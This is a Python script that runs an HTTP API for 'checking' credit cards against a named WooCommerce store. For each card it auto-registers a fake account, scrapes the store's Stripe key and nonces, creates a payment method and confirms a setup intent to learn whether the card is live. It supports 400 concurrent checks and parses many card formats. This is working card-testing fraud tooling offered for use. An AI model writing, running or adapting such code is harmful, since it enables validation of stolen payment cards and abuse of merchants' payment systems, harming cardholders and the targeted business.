#!/usr/bin/env python3
"""
HandToolEssentials.com Stripe Auth Checker API
Pydroid 3 Compatible | High Concurrency | No File Storage
"""

import asyncio
import aiohttp
import json
import random
import re
import string
import time
from datetime import datetime
from typing import Dict, Optional
import sys
import socket
from aiohttp import web

# ========== CONFIGURATION ==========
CONFIG = {
    "domain": "handtoolessentials.com",
    "max_concurrent": 400,  # Handle 400 concurrent requests
    "port": 8000
}

# ========== HELPER FUNCTIONS ==========

def generate_email() -> str:
    """Generate random email for registration."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'

def generate_password() -> str:
    """Generate random password for registration."""
    return ''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=12))

def parse_cc_line(cc_string: str) -> Optional[Dict]:
    """Parse card from various formats."""
    cc_string = cc_string.strip()
    if not cc_string:
        return None
    
    # Remove spaces
    cc_string = cc_string.replace(' ', '')
    
    # Try different separators
    for sep in ['|', ':', ';', '/', '-', ' ']:
        if sep in cc_string:
            parts = [p.strip() for p in cc_string.split(sep) if p.strip()]
            if len(parts) >= 4:
                card_num = None
                month = None
                year = None
                cvv = None
                
                for part in parts:
                    if re.match(r'^\d{15,16}$', part) and not card_num:
                        card_num = part
                    elif re.match(r'^\d{1,2}$', part) and not month:
                        month = part.zfill(2)
                    elif re.match(r'^\d{2,4}$', part) and not year:
                        year = part[-2:] if len(part) > 2 else part
                    elif re.match(r'^\d{3,4}$', part) and not cvv:
                        cvv = part
                
                if card_num and month and year and cvv:
                    return {
                        "number": card_num,
                        "month": month,
                        "year": year,
                        "cvv": cvv,
                        "formatted": f"{card_num}|{month}|{year}|{cvv}"
                    }
    
    # Check if it's already in pipe format
    if re.match(r'^\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}$', cc_string):
        parts = cc_string.split('|')
        return {
            "number": parts[0],
            "month": parts[1].zfill(2),
            "year": parts[2][-2:] if len(parts[2]) > 2 else parts[2],
            "cvv": parts[3],
            "formatted": cc_string
        }
    
    return None

# ========== STRIPE CHECKER ==========

class HandToolsChecker:
    def __init__(self, domain: str):
        self.domain = domain
        self.session = None
        self.headers = {
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 Chrome/137.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "accept-language": "en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7",
        }
    
    async def __aenter__(self):
        """Create session with cookie jar."""
        conn = aiohttp.TCPConnector(
            limit=0,  # No connection limit
            limit_per_host=0,  # No per-host limit
            ttl_dns_cache=300,
            force_close=False,
            enable_cleanup_closed=True
        )
        self.session = aiohttp.ClientSession(connector=conn)
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()
    
    def _parse_value(self, data: str, start: str, end: str) -> str:
        """Extract value between start and end strings."""
        try:
            start_pos = data.index(start) + len(start)
            end_pos = data.index(end, start_pos)
            return data[start_pos:end_pos]
        except ValueError:
            return "None"
    
    async def get_register_nonce(self) -> Optional[str]:
        """Extract woocommerce-register-nonce."""
        try:
            url = f"https://{self.domain}/my-account/"
            async with self.session.get(url, headers=self.headers, timeout=15) as res:
                html = await res.text()
                try:
                    return html.split('woocommerce-register-nonce" value="')[1].split('"')[0]
                except:
                    return None
        except Exception:
            return None
    
    async def register_account(self, email: str, password: str, nonce: str) -> bool:
        """Register with email and password."""
        try:
            url = f"https://{self.domain}/my-account/"
            
            post_headers = self.headers.copy()
            post_headers.update({
                "content-type": "application/x-www-form-urlencoded",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/my-account/",
            })
            
            data = {
                "email": email,
                "password": password,
                "woocommerce-register-nonce": nonce,
                "_wp_http_referer": "/my-account/",
                "register": "Register"
            }
            
            async with self.session.post(url, headers=post_headers, data=data, timeout=15) as res:
                html = await res.text()
                return 'logout' in html.lower() or 'dashboard' in html.lower()
        except Exception:
            return False
    
    async def get_stripe_key(self) -> Optional[str]:
        """Extract Stripe publishable key."""
        try:
            url = f"https://{self.domain}/my-account/add-payment-method/"
            async with self.session.get(url, headers=self.headers, timeout=15) as res:
                html = await res.text()
                match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html)
                return match.group(0) if match else None
        except Exception:
            return None
    
    async def get_setup_intent_nonce(self) -> Optional[str]:
        """Extract createAndConfirmSetupIntentNonce."""
        try:
            url = f"https://{self.domain}/my-account/add-payment-method/"
            async with self.session.get(url, headers=self.headers, timeout=15) as res:
                html = await res.text()
                
                # Exact method from original aus.py
                nonce = self._parse_value(html, '"createAndConfirmSetupIntentNonce":"', '"')
                
                if nonce and nonce != "None":
                    return nonce
                
                # Try alternate pattern
                if not nonce or nonce == "None":
                    match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html)
                    if match:
                        return match.group(1)
                
                return None
        except Exception:
            return None
    
    async def create_payment_method(self, stripe_key: str, card_number: str, exp_month: str, exp_year: str, cvv: str) -> Optional[str]:
        """Create Stripe payment method."""
        try:
            url = "https://api.stripe.com/v1/payment_methods"
            
            stripe_headers = {
                "accept": "application/json",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "referer": "https://js.stripe.com/",
                "user-agent": self.headers["user-agent"],
            }
            
            card_number = card_number.replace(' ', '')
            exp_year = exp_year[-2:] if len(exp_year) > 2 else exp_year
            
            data = {
                "type": "card",
                "card[number]": card_number,
                "card[cvc]": cvv,
                "card[exp_year]": exp_year,
                "card[exp_month]": exp_month,
                "billing_details[address][postal_code]": "10080",
                "billing_details[address][country]": "US",
                "key": stripe_key,
                "_stripe_version": "2024-06-20",
            }
            
            async with self.session.post(url, headers=stripe_headers, data=data, timeout=20) as res:
                if res.status == 200:
                    response = await res.json()
                    return response.get('id')
                return None
        except Exception:
            return None
    
    async def confirm_setup_intent(self, payment_method_id: str, nonce: str) -> dict:
        """Confirm setup intent."""
        try:
            url = f"https://{self.domain}/wp-admin/admin-ajax.php"
            
            ajax_headers = {
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": f"https://{self.domain}",
                "referer": f"https://{self.domain}/my-account/add-payment-method/",
                "user-agent": self.headers["user-agent"],
                "x-requested-with": "XMLHttpRequest"
            }
            
            data = {
                "action": "wc_stripe_create_and_confirm_setup_intent",
                "wc-stripe-payment-method": payment_method_id,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": nonce
            }
            
            async with self.session.post(url, headers=ajax_headers, data=data, timeout=20) as res:
                try:
                    return await res.json()
                except:
                    return {"success": False}
        except Exception:
            return {"success": False}
    
    async def check_card(self, card_string: str) -> dict:
        """Complete card checking flow."""
        start_time_val = time.time()
        email = generate_email()
        password = generate_password()
        
        try:
            # Step 1: Get register nonce
            register_nonce = await self.get_register_nonce()
            if not register_nonce:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "REGISTER_NONCE_ERROR",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 2: Register account
            registered = await self.register_account(email, password, register_nonce)
            if not registered:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "REGISTER_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 3: Get Stripe key
            stripe_key = await self.get_stripe_key()
            if not stripe_key:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "STRIPE_KEY_ERROR",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 4: Parse card
            parts = card_string.split('|')
            card_number, exp_month, exp_year, cvv = parts
            
            # Step 5: Create payment method
            pm_id = await self.create_payment_method(stripe_key, card_number, exp_month, exp_year, cvv)
            if not pm_id:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "PAYMENT_METHOD_FAILED",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 6: Get setup nonce
            setup_nonce = await self.get_setup_intent_nonce()
            if not setup_nonce:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "ERROR",
                    "code": "SETUP_NONCE_ERROR",
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
            # Step 7: Confirm setup intent
            result = await self.confirm_setup_intent(pm_id, setup_nonce)
            
            # Step 8: Parse result
            success = result.get('success', False)
            
            if success:
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "APPROVED",
                    "code": "CARD_VALID",
                    "live": True,
                    "pm_id": pm_id[:10] + "..." + pm_id[-6:] if pm_id else None,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            else:
                error_code = "CARD_DECLINED"
                error_msg = json.dumps(result).lower()
                
                if 'insufficient_funds' in error_msg:
                    error_code = "INSUFFICIENT_FUNDS"
                elif 'invalid_cvc' in error_msg:
                    error_code = "INVALID_CVC"
                elif 'expired_card' in error_msg:
                    error_code = "EXPIRED_CARD"
                elif 'incorrect_number' in error_msg:
                    error_code = "INCORRECT_NUMBER"
                
                return {
                    "cc": card_string[:6] + "..." + card_string[-4:],
                    "status": "DECLINED",
                    "code": error_code,
                    "live": False,
                    "time": int((time.time() - start_time_val) * 1000)
                }
            
        except Exception as e:
            return {
                "cc": card_string[:6] + "..." + card_string[-4:],
                "status": "ERROR",
                "code": "CHECK_ERROR",
                "error": str(e)[:50],
                "live": False,
                "time": int((time.time() - start_time_val) * 1000)
            }

# ========== API HANDLERS ==========

semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])

async def check_cc_handler(request):
    """Handle /check?cc=... requests with high concurrency."""
    cc_param = request.query.get('cc', '')
    
    if not cc_param:
        return web.json_response({
            "error": "Missing cc parameter",
            "usage": "/check?cc=4111111111111111|12|25|123"
        }, status=400)
    
    # Parse card
    parsed_card = parse_cc_line(cc_param)
    if not parsed_card:
        return web.json_response({
            "error": "Invalid card format",
            "example": "4111111111111111|12|25|123"
        }, status=400)
    
    # Use semaphore for concurrency control
    async with semaphore:
        try:
            async with HandToolsChecker(CONFIG["domain"]) as checker:
                result = await checker.check_card(parsed_card["formatted"])
                return web.json_response(result)
        except Exception as e:
            return web.json_response({
                "cc": cc_param[:6] + "..." + cc_param[-4:],
                "status": "ERROR",
                "code": "API_ERROR",
                "error": str(e)[:50],
                "live": False,
                "time": 0
            }, status=500)

async def health_handler(request):
    """Simple health check endpoint."""
    return web.json_response({
        "status": "online",
        "service": "HandTools CC Checker API",
        "max_concurrent": CONFIG["max_concurrent"],
        "active_requests": CONFIG["max_concurrent"] - semaphore._value if hasattr(semaphore, '_value') else 0
    })

async def root_handler(request):
    """Root endpoint with instructions."""
    return web.json_response({
        "name": "HandTools Essentials CC Checker API",
        "version": "1.0",
        "endpoints": {
            "/check?cc={card}": "Check single credit card (supports multiple formats)",
            "/health": "Check API status"
        },
        "examples": {
            "pipe": "/check?cc=4111111111111111|12|25|123",
            "space": "/check?cc=4111111111111111 12 25 123",
            "colon": "/check?cc=4111111111111111:12:25:123"
        },
        "concurrency": f"Up to {CONFIG['max_concurrent']} simultaneous checks"
    })

# ========== MAIN ==========

async def main():
    """Start the API server."""
    print("\033[96m\033[1m")
    print("╔══════════════════════════════════════════════════════════════╗")
    print("║         HANDTOOLESSENTIALS.COM CC CHECKER API                ║")
    print("║         Pydroid 3 Compatible | 400 Concurrent               ║")
    print("║         No File Storage | No Limits                         ║")
    print("╚══════════════════════════════════════════════════════════════╝")
    print("\033[0m")
    
    # Get local IP for network access
    hostname = socket.gethostname()
    local_ip = socket.gethostbyname(hostname)
    
    # Setup app
    app = web.Application()
    app.router.add_get('/', root_handler)
    app.router.add_get('/check', check_cc_handler)
    app.router.add_get('/health', health_handler)
    
    print(f"\033[92m✅ Server started successfully!\033[0m")
    print(f"\033[93m📱 Local: http://localhost:{CONFIG['port']}\033[0m")
    print(f"\033[93m🌐 Network: http://{local_ip}:{CONFIG['port']}\033[0m")
    print(f"\033[96m🚀 Max concurrent checks: {CONFIG['max_concurrent']}\033[0m")
    print(f"\033[92m📝 Ready to accept requests...\033[0m\n")
    
    # Start server
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', CONFIG["port"])
    await site.start()
    
    # Keep running
    await asyncio.Event().wait()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\033[93m⚠️ Server stopped by user\033[0m")
    except Exception as e:
        print(f"\033[91m❌ Fatal error: {e}\033[0m")